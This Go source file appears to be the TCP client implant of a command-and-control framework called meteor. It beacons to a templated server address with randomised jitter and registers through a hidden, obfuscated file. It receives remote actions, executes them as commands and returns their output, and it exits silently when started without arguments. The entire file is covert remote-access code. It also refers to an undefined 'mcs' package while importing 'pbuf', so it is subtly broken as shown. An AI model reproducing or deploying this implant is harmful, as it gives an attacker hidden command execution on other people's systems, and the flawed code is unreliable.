package main

import (
	"encoding/base64"
	"fmt"
	cUtils "github.com/degenerat3/meteor/meteor/clients/utils"
	"github.com/degenerat3/meteor/meteor/pbuf"
	"github.com/golang/protobuf/proto"
	"math/rand"
	"net"
	"os"
	"time"
)

// SERVER is the IP/port of the TCP server to connect to (ex: `192.168.1.2:1234`)
var SERVER = "$$SERVER$$"

// INTERVAL is how long to sleep between callbacks
var INTERVAL = 1234123499

// DELTA is the jitter/variation in interval per cycle
var DELTA = 4321432199

// REGFILE is the path to the disk location where the registration file will be kept (ex: `/etc/ botconf.txt`)
var REGFILE = "$$REGFILE$$"

// OBFTEXT is the obfuscation text that will be used when generating the regfile
var OBFTEXT = "$$OBFTEXT$$"

// DEBUG specifies if execution of the client will write output
var DEBUG = false

func main() {
	if len(os.Args) != 2 && len(os.Args) != 3 {
		if DEBUG {
			fmt.Println("Executed without arguments, exiting...")
		}
		os.Exit(0)
	}
	for {
		var payload string
		regstat := cUtils.CheckRegStatus(REGFILE)
		if DEBUG {
			fmt.Printf("RegStat: %t\n", regstat)
		}
		if regstat {
			payload = cUtils.GenCheckin(REGFILE, OBFTEXT)
		} else {
			payload = cUtils.GenRegister(INTERVAL, DELTA, REGFILE, OBFTEXT)
		}
		if DEBUG {
			fmt.Printf("Payload: %s\n", payload)
		}
		conn, err := net.Dial("tcp", SERVER)
		if err != nil {
			if DEBUG {
				fmt.Printf("Error connecting to server: %s\n", err.Error())
			}
			endCheck()
			continue
		}
		if DEBUG {
			fmt.Printf("Writing payload to conn...\n")
		}
		conn.Write([]byte(payload))
		data := make([]byte, 16384)
		if DEBUG {
			fmt.Printf("Reading data from conn...\n")
		}
		conn.Read(data)
		decoded, err := base64.StdEncoding.DecodeString(string(data))
		if DEBUG {
			fmt.Printf("Got response: %s\n", decoded)
		}
		resp := &mcs.MCS{}
		err = proto.Unmarshal(decoded, resp)
		if err != nil {
			if DEBUG {
				fmt.Printf("Error unmarshalling data: %s\n", err.Error())
			}
			endCheck()
			continue
		}
		mode := resp.GetMode()
		if DEBUG {
			fmt.Printf("Recd mode: %s\n", mode)
		}
		if mode == "0" {
			endCheck()
			continue
		}
		actions := resp.GetActions()
		for _, acn := range actions {
			uid := acn.GetUuid()
			if DEBUG {
				fmt.Printf("Handling action: %s\n", uid)
			}
			mod := acn.GetMode()
			args := acn.GetArgs()
			acnOut := cUtils.ExecCommand(mod, args)
			acnResp := &mcs.MCS{
				Uuid:   uid,
				Result: acnOut,
			}
			acnData, err := proto.Marshal(acnResp)
			if err != nil {
				if DEBUG {
					fmt.Printf("Error marshalling data: %s\n", err.Error())
				}
			}
			if DEBUG {
				fmt.Printf("Writing response data...\n")
			}
			conn.Write(acnData)
			acnAck := make([]byte, 512)
			conn.Read(acnAck) // read the "Add response" status, even tho we don't check it rn
		}
		endCheck()
		conn.Close()

	}
}

func endCheck() {
	if DEBUG {
		fmt.Printf("Checking if program should exit...\n")
	}
	if len(os.Args) == 3 {
		os.Exit(0)
	}
	min := INTERVAL - DELTA
	max := INTERVAL + DELTA
	sleeptime := rand.Intn(max-min) + min
	if DEBUG {
		fmt.Printf("Sleeping for %d seconds...\n", sleeptime)
	}
	time.Sleep(time.Duration(sleeptime) * time.Second)
}
